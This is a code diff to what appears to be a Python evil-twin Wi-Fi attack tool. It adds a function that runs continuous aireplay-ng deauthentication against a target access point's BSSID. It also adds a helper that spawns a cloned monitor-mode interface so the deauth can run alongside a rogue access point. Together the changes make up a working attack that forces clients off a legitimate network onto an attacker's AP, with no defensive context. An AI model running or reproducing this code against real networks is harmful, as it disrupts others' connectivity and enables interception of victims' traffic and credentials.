@@ -15,12 +15,14 @@ from terminal import (clear,
                       run_command,
                       run_command_print_output,
                       popen_command,
-                      popen_command_new_terminal)
+                      popen_command_new_terminal,
+                      check_output)
 
 from interface_management import (change_interface,
                                   is_interface_monitor,
                                   switch_interface_to_monitor_mode,
-                                  switch_interface_to_managed_mode)
+                                  switch_interface_to_managed_mode,
+                                  switch_interface_channel)
 
 from color import (red,
                    green)
@@ -112,10 +114,44 @@ def rogue_ap(interface, internet_facing_interface, target_ap, channel,Called_fro
     if Called_from_EvilTwin:
         return
 
+def aireplay(interface,bssid,channel):
+    switch_interface_channel(interface,channel)
+    popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {bssid} --ignore-negative-one {interface}')
+
+def create_new_interface(interface,channel):
+    """
+    Issue 1
+    :param interface:
+    :return:
+    """
+    monitor_interface = interface+'clone' # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time
+    output = check_output('iw dev')
+    lines = output.split('\n')
+    phy = '12'
+    for i, line in enumerate(lines):
+        if f"Interface {interface}" in line:
+            phy_line = lines[i - 1]
+            phy = phy_line.strip().split()[0]
+            phy = phy.replace("#", "")
+    run_command(f'iw {phy} interface add {monitor_interface} type monitor')
+    run_command(f'ip link set {monitor_interface} up')
+    return monitor_interface
+
+
+
 def evil_twin_deauth(interface, internet_facing_interface, target_ap):
+    """
+
+
+    :param interface:
+    :param internet_facing_interface:
+    :param target_ap:
+    :return:
+    """
     bssid,channel = get_bssid_and_station_from_ap(interface,target_ap)
+    mon = create_new_interface(interface,channel)
+    aireplay(mon,bssid,channel)
     rogue_ap(interface,internet_facing_interface,target_ap,channel,Called_from_EvilTwin=True)
-    # popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {bssid} --ignore-negative-one {interface}')
     input('Press Enter to Quit Evil Twin')
     close(interface, internet_facing_interface)
 def close(interface, internet_facing_interface,called_from_evil_twin=False):
